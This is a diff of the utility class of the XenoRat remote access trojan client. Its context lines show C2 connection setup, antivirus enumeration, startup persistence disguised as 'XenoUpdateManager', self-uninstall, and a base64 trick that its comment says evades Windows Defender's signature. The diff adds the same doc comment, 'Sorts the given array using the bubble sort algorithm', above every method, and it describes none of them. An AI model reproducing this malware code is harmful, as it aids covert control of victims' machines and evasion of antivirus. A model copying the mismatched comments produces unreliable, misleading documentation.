@@ -19,26 +19,61 @@ namespace xeno_rat_client
 {
     public class Utils
     {
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("shell32.dll", SetLastError = true)]
         [return: MarshalAs(UnmanagedType.Bool)]
         private static extern bool IsUserAnAdmin();
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern IntPtr GetForegroundWindow();
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
         private static extern int GetWindowTextLength(IntPtr hWnd);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         private static extern IntPtr GetWindowThreadProcessId(IntPtr hWnd, out uint ProcessId);
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("User32.dll")]
         private static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
 
-
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         [DllImport("user32.dll")]
         private static extern bool CloseHandle(IntPtr hObject);
 
@@ -49,10 +84,21 @@ namespace xeno_rat_client
             public uint dwTime;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static async Task<string> GetCaptionOfActiveWindowAsync() 
         {
             return await Task.Run(() => GetCaptionOfActiveWindow());
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string GetCaptionOfActiveWindow()
         {
             string strTitle = string.Empty;
@@ -85,6 +131,11 @@ namespace xeno_rat_client
             return strTitle;
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static bool IsAdmin()
         {
             bool admin = false;
@@ -95,6 +146,12 @@ namespace xeno_rat_client
             catch { }
             return admin;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string GetAntivirus()
         {
             List<string> antivirus = new List<string>();
@@ -129,6 +186,11 @@ namespace xeno_rat_client
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string GetWindowsVersion()
         {
             string r = "";
@@ -146,6 +208,12 @@ namespace xeno_rat_client
             }
             return r;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string HWID()
         {
             try
@@ -158,6 +226,11 @@ namespace xeno_rat_client
             }
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static string GetHash(string strToHash)
         {
             MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
@@ -168,6 +241,12 @@ namespace xeno_rat_client
                 strResult.Append(b.ToString("x2"));
             return strResult.ToString().Substring(0, 20).ToUpper();
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static async Task<Node> ConnectAndSetupAsync(Socket sock, byte[] key, int type = 0, int ID = 0, Action<Node> OnDisconnect = null)
         {
             Node conn;
@@ -185,6 +264,12 @@ namespace xeno_rat_client
             }
             return conn;
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async static Task RemoveStartup(string executablePath) 
         {
             await Task.Run(() =>
@@ -264,6 +349,12 @@ namespace xeno_rat_client
 
             
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async static Task Uninstall() 
         {
             // the base64 encoded part is "/C choice /C Y /N /D Y /T 3 & Del \"", this for some reason throws off the XenoRat windows defender sig
@@ -278,6 +369,11 @@ namespace xeno_rat_client
             Process.GetCurrentProcess().Kill();
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public async static Task<bool> AddToStartupNonAdmin(string executablePath, string name= "XenoUpdateManager")
         {
             return await Task.Run(() =>
@@ -297,6 +393,12 @@ namespace xeno_rat_client
                         }
                    });
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static async Task<bool> AddToStartupAdmin(string executablePath, string name = "XenoUpdateManager")
         {
             try
@@ -356,10 +458,21 @@ namespace xeno_rat_client
             return false; 
         }
 
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static async Task<uint> GetIdleTimeAsync() 
         {
             return await Task.Run(() => GetIdleTime());
         }
+
+        /// <summary>
+        /// Sorts the given array using the bubble sort algorithm.
+        /// </summary>
+        /// <param name="arr">The array to be sorted.</param>
+        /// <param name="n">The number of elements in the array.</param>
         public static uint GetIdleTime()
         {
             LASTINPUTINFO lastInPut = new LASTINPUTINFO();
